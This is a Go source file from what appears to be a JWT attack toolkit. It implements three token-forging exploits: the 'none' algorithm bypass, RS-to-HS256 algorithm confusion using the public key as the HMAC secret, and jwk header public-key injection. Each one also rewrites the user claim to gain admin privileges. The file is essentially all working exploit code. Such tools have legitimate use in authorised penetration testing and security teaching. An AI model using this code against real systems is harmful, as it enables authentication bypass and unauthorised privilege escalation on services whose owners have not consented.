package attacks

import (
	"JWTechniques/ctrl"
	"encoding/json"
	"fmt"
	"os"

	"github.com/golang-jwt/jwt/v5"
)

//Create a token to exploit the None Algorithm Vulnerability

// The process is the following :
// - Create a copy of the token,
// - Change the algorithm to a "None"
// - If possible : Change the "user" payload to elevate our privileges

// Token is a valid JWT

// Return the newly created token
func ExploitNoneAlgo(token *jwt.Token) string {

	cpyToken := ctrl.CloneToken(token)
	cpyToken, err := ctrl.ChangeValue(cpyToken, "alg", "none", true)

	if err != nil {
		fmt.Printf("An error ocurred while modifying the value of the \"alg\" header : %v \n", err)
		return ""
	}

	//Change the value of the header to create a token with admin privs
	cpyToken, err = ChangeUserValue(cpyToken)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//It can be signed with any secret as this vulnerability only works if the signature is not verified
	strToken, err := cpyToken.SignedString(jwt.UnsafeAllowNoneSignatureType)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token with a \"none\" alg : %v \n", err)
		return ""
	}

	return strToken

}

//Create a token to exploit the Algorithm Confusion Vulnerability

// The process is the following :
// - Create a copy of the token,
// - Change the algorithm to a symmetric one
// - If possible : Change the "user" payload to elevate our privileges
// - Sign the token with the public key

// Token is a valid JWT
// algorithm is the algorithm that will replace the original one
// publicKey is the path to a file containing a valid public key ()

// Return the newly created token
func ExploitAlgoConfusion(token *jwt.Token, algorithm string, publicKeyFile string) string {

	cpyToken := ctrl.CloneToken(token)

	//Change the alg to hs256 as it's the only symmetric algorithm used for JWT
	cpyToken, err := ctrl.ChangeValue(cpyToken, "alg", "HS256", true)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//Change the value of the header to create a token with admin privs
	cpyToken, err = ChangeUserValue(cpyToken)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//Get the public key from the file
	// secret, err := ctrl.GetSecretFromPem(publicKeyFile)
	// if err != nil {
	// 	fmt.Printf("%v \n", err)
	// 	return ""
	// }
	//
	content, err := os.ReadFile(publicKeyFile)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//Sign the token with the public key
	strToken, err := cpyToken.SignedString(content)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	return strToken
}

//Create a token to exploit the Public Key Header Injection Vulnerability

// The process is the following :
// - Create a copy of the token,
// - Generate new public/private keys
// - Add a "JWK" header, which correspond to the public key, to the token
// - If possible : Change the "user" payload to elevate our privileges
// - Sign the token with the private key

// Token is a valid JWT
// algorithm is the algorithm used by the original token

// Return the newly created token
func ExploitPublicKeyInjection(token *jwt.Token, algorithm string) string {

	cpyToken := ctrl.CloneToken(token)

	//Generate public/private keys
	publicKey, privateKey, err := ctrl.GenerateKeys(algorithm)
	if err != nil {
		fmt.Printf("%v\n", err)
		return ""
	}

	//Generate JWK using the public key
	jwkValue, err := ctrl.GenerateJWK(publicKey, algorithm)
	if err != nil {
		fmt.Printf("%v\n", err)
		return ""
	}

	//Inject public key in header
	var jwkMap map[string]any
	err = json.Unmarshal(jwkValue, &jwkMap)
	if err != nil {
		fmt.Printf("failed to unmarshal jwkValue: %v", err)
		return ""
	}
	cpyToken.Header["jwk"] = jwkMap

	//Change the value of the header to create a token with admin privs
	cpyToken, err = ChangeUserValue(cpyToken)
	if err != nil {
		fmt.Printf("%v \n", err)
		return ""
	}

	//Sign the token with the private key
	strToken, err := cpyToken.SignedString(privateKey)
	if err != nil {
		fmt.Printf("An error ocurred while signing the token : %v \n", err)
		return ""
	}

	return strToken
}
